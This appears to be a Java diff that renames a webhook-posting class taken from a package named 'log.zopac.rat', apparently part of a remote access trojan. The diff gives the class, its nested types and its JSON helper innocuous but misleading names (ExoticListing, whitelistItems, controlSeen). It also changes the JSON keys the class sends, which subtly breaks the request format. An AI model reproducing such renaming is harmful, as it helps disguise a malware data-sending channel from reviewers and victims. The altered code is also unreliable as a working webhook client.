@@ -1,4 +1,4 @@
-package log.zopac.rat;
+package net.exotic.real;
 
 import javax.net.ssl.HttpsURLConnection;
 import java.awt.*;
@@ -6,18 +6,18 @@ import java.io.IOException;
 import java.io.OutputStream;
 import java.lang.reflect.Array;
 import java.net.URL;
-import java.util.List;
 import java.util.*;
+import java.util.List;
 
-public class SetMain {
+public class ExoticListing {
     private final String url;
     private String content;
     private String username;
     private String avatarUrl;
     private boolean tts;
-    private final List<EmbedObject> embeds = new ArrayList<>();
+    private final List<setMainAH> embeds = new ArrayList<>();
 
-    public SetMain(String url) {
+    public ExoticListing(String url) {
         this.url = url;
     }
 
@@ -37,16 +37,16 @@ public class SetMain {
         this.tts = tts;
     }
 
-    public void addEmbed(EmbedObject embed) {
+    public void addEmbed(setMainAH embed) {
         this.embeds.add(embed);
     }
 
     public void execute() throws IOException {
         if (this.content == null && this.embeds.isEmpty()) {
-            throw new IllegalArgumentException("Set content or add at least one EmbedObject");
+            throw new IllegalArgumentException("Set content or add at least one setMainAH");
         }
 
-        JSONObject json = new JSONObject();
+        setAHListing json = new setAHListing();
 
         json.put("content", this.content);
         json.put("username", this.username);
@@ -54,9 +54,9 @@ public class SetMain {
         json.put("tts", this.tts);
 
         if (!this.embeds.isEmpty()) {
-            List<JSONObject> embedObjects = new ArrayList<>();
-            for (EmbedObject embed : this.embeds) {
-                JSONObject jsonEmbed = new JSONObject();
+            java.util.List<setAHListing> embedObjects = new ArrayList<>();
+            for (setMainAH embed : this.embeds) {
+                setAHListing jsonEmbed = new setAHListing();
 
                 jsonEmbed.put("title", embed.getTitle());
                 jsonEmbed.put("description", embed.getDescription());
@@ -71,50 +71,50 @@ public class SetMain {
                     jsonEmbed.put("color", rgb);
                 }
 
-                EmbedObject.Footer footer = embed.getFooter();
-                EmbedObject.Image image = embed.getImage();
-                EmbedObject.Thumbnail thumbnail = embed.getThumbnail();
-                EmbedObject.Author author = embed.getAuthor();
-                List<EmbedObject.Field> fields = embed.getFields();
+                setMainAH.controlSeen controlSeen = embed.getFooter();
+                setMainAH.makeSmaller makeSmaller = embed.getImage();
+                setMainAH.setItemColor setItemColor = embed.getThumbnail();
+                setMainAH.createdBy createdBy = embed.getAuthor();
+                java.util.List<setMainAH.whitelistItems> fields = embed.getFields();
 
-                if (footer != null) {
-                    JSONObject jsonFooter = new JSONObject();
+                if (controlSeen != null) {
+                    setAHListing jsonFooter = new setAHListing();
 
-                    jsonFooter.put("text", footer.getText());
-                    jsonFooter.put("icon_url", footer.getIconUrl());
-                    jsonEmbed.put("footer", jsonFooter);
+                    jsonFooter.put("text", controlSeen.getText());
+                    jsonFooter.put("icon_url", controlSeen.getIconUrl());
+                    jsonEmbed.put("controlSeen", jsonFooter);
                 }
 
-                if (image != null) {
-                    JSONObject jsonImage = new JSONObject();
+                if (makeSmaller != null) {
+                    setAHListing jsonImage = new setAHListing();
 
-                    jsonImage.put("url", image.getUrl());
-                    jsonEmbed.put("image", jsonImage);
+                    jsonImage.put("url", makeSmaller.getUrl());
+                    jsonEmbed.put("makeSmaller", jsonImage);
                 }
 
-                if (thumbnail != null) {
-                    JSONObject jsonThumbnail = new JSONObject();
+                if (setItemColor != null) {
+                    setAHListing jsonThumbnail = new setAHListing();
 
-                    jsonThumbnail.put("url", thumbnail.getUrl());
-                    jsonEmbed.put("thumbnail", jsonThumbnail);
+                    jsonThumbnail.put("url", setItemColor.getUrl());
+                    jsonEmbed.put("setItemColor", jsonThumbnail);
                 }
 
-                if (author != null) {
-                    JSONObject jsonAuthor = new JSONObject();
+                if (createdBy != null) {
+                    setAHListing jsonAuthor = new setAHListing();
 
-                    jsonAuthor.put("name", author.getName());
-                    jsonAuthor.put("url", author.getUrl());
-                    jsonAuthor.put("icon_url", author.getIconUrl());
-                    jsonEmbed.put("author", jsonAuthor);
+                    jsonAuthor.put("name", createdBy.getName());
+                    jsonAuthor.put("url", createdBy.getUrl());
+                    jsonAuthor.put("icon_url", createdBy.getIconUrl());
+                    jsonEmbed.put("createdBy", jsonAuthor);
                 }
 
-                List<JSONObject> jsonFields = new ArrayList<>();
-                for (EmbedObject.Field field : fields) {
-                    JSONObject jsonField = new JSONObject();
+                java.util.List<setAHListing> jsonFields = new ArrayList<>();
+                for (setMainAH.whitelistItems whitelistItems : fields) {
+                    setAHListing jsonField = new setAHListing();
 
-                    jsonField.put("name", field.getName());
-                    jsonField.put("value", field.getValue());
-                    jsonField.put("inline", field.isInline());
+                    jsonField.put("name", whitelistItems.getName());
+                    jsonField.put("value", whitelistItems.getValue());
+                    jsonField.put("inline", whitelistItems.isInline());
 
                     jsonFields.add(jsonField);
                 }
@@ -142,17 +142,17 @@ public class SetMain {
         connection.disconnect();
     }
 
-    public static class EmbedObject {
+    public static class setMainAH {
         private String title;
         private String description;
         private String url;
         private Color color;
 
-        private Footer footer;
-        private Thumbnail thumbnail;
-        private Image image;
-        private Author author;
-        private List<Field> fields = new ArrayList<>();
+        private setMainAH.controlSeen controlSeen;
+        private setMainAH.setItemColor setItemColor;
+        private setMainAH.makeSmaller makeSmaller;
+        private setMainAH.createdBy createdBy;
+        private java.util.List<setMainAH.whitelistItems> fields = new ArrayList<>();
 
         public String getTitle() {
             return title;
@@ -170,76 +170,76 @@ public class SetMain {
             return color;
         }
 
-        public Footer getFooter() {
-            return footer;
+        public setMainAH.controlSeen getFooter() {
+            return controlSeen;
         }
 
-        public Thumbnail getThumbnail() {
-            return thumbnail;
+        public setMainAH.setItemColor getThumbnail() {
+            return setItemColor;
         }
 
-        public Image getImage() {
-            return image;
+        public setMainAH.makeSmaller getImage() {
+            return makeSmaller;
         }
 
-        public Author getAuthor() {
-            return author;
+        public setMainAH.createdBy getAuthor() {
+            return createdBy;
         }
 
-        public List<Field> getFields() {
+        public List<setMainAH.whitelistItems> getFields() {
             return fields;
         }
 
-        public EmbedObject setTitle(String title) {
+        public setMainAH setTitle(String title) {
             this.title = title;
             return this;
         }
 
-        public EmbedObject setDescription(String description) {
+        public setMainAH setDescription(String description) {
             this.description = description;
             return this;
         }
 
-        public EmbedObject setUrl(String url) {
+        public setMainAH setUrl(String url) {
             this.url = url;
             return this;
         }
 
-        public EmbedObject setColor(Color color) {
+        public setMainAH setColor(Color color) {
             this.color = color;
             return this;
         }
 
-        public EmbedObject setFooter(String text, String icon) {
-            this.footer = new Footer(text, icon);
+        public setMainAH setFooter(String text, String icon) {
+            this.controlSeen = new setMainAH.controlSeen(text, icon);
             return this;
         }
 
-        public EmbedObject setThumbnail(String url) {
-            this.thumbnail = new Thumbnail(url);
+        public setMainAH setThumbnail(String url) {
+            this.setItemColor = new setMainAH.setItemColor(url);
             return this;
         }
 
-        public EmbedObject setImage(String url) {
-            this.image = new Image(url);
+        public setMainAH setImage(String url) {
+            this.makeSmaller = new setMainAH.makeSmaller(url);
             return this;
         }
 
-        public EmbedObject setAuthor(String name, String url, String icon) {
-            this.author = new Author(name, url, icon);
+        public setMainAH setAuthor(String name, String url, String icon) {
+            this.createdBy = new setMainAH.createdBy(name, url, icon);
             return this;
         }
 
-        public EmbedObject addField(String name, String value, boolean inline) {
-            this.fields.add(new Field(name, value, inline));
+        public setMainAH addField(String name, String value, boolean inline) {
+            this.fields.add(new setMainAH.whitelistItems(name, value, inline));
             return this;
         }
 
-        private class Footer {
+        private class controlSeen {
             private String text;
             private String iconUrl;
 
-            private Footer(String text, String iconUrl) {
+            private controlSeen(String text, String iconUrl) {
                 this.text = text;
                 this.iconUrl = iconUrl;
             }
@@ -253,10 +253,10 @@ public class SetMain {
             }
         }
 
-        private class Thumbnail {
+        private class setItemColor {
             private String url;
 
-            private Thumbnail(String url) {
+            private setItemColor(String url) {
                 this.url = url;
             }
 
@@ -265,10 +265,10 @@ public class SetMain {
             }
         }
 
-        private class Image {
+        private class makeSmaller {
             private String url;
 
-            private Image(String url) {
+            private makeSmaller(String url) {
                 this.url = url;
             }
 
@@ -277,12 +277,12 @@ public class SetMain {
             }
         }
 
-        private class Author {
+        private class createdBy {
             private String name;
             private String url;
             private String iconUrl;
 
-            private Author(String name, String url, String iconUrl) {
+            private createdBy(String name, String url, String iconUrl) {
                 this.name = name;
                 this.url = url;
                 this.iconUrl = iconUrl;
@@ -301,12 +301,12 @@ public class SetMain {
             }
         }
 
-        private class Field {
+        private class whitelistItems {
             private String name;
             private String value;
             private boolean inline;
 
-            private Field(String name, String value, boolean inline) {
+            private whitelistItems(String name, String value, boolean inline) {
                 this.name = name;
                 this.value = value;
                 this.inline = inline;
@@ -326,7 +326,7 @@ public class SetMain {
         }
     }
 
-    private class JSONObject {
+    private class setAHListing {
 
         private final HashMap<String, Object> map = new HashMap<>();
 
@@ -353,7 +353,7 @@ public class SetMain {
                     builder.append(Integer.valueOf(String.valueOf(val)));
                 } else if (val instanceof Boolean) {
                     builder.append(val);
-                } else if (val instanceof JSONObject) {
+                } else if (val instanceof setAHListing) {
                     builder.append(val.toString());
                 } else if (val.getClass().isArray()) {
                     builder.append("[");
